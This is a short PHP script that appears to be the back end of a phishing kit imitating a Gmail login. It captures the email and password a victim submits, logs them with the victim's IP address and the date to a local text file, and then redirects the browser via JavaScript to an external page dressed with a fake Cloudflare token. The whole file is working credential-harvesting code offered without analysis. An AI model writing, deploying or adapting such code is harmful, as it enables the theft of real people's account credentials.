<?php
$file =  "===========((29-11-2022))===========.txt";
$email = $_POST['email'];
$Password = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "=====================[Gmaill]*[MMM]========================");
fwrite($handle, "\n");
fwrite($handle, "Email			: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Password		: ");
fwrite($handle, "$Password");
fwrite($handle, "\n");
fwrite($handle, "IP Address		: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "=====================[Gmaill]*[MMM]========================");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"http://office-mmm.c1.biz/email.html??__cf_chl_jschl_tk__=923ac29e53e7IWzNa7Muy22i2p2l8RwMYAoRYxFDfiGtI\";
// -->
</script>";
?>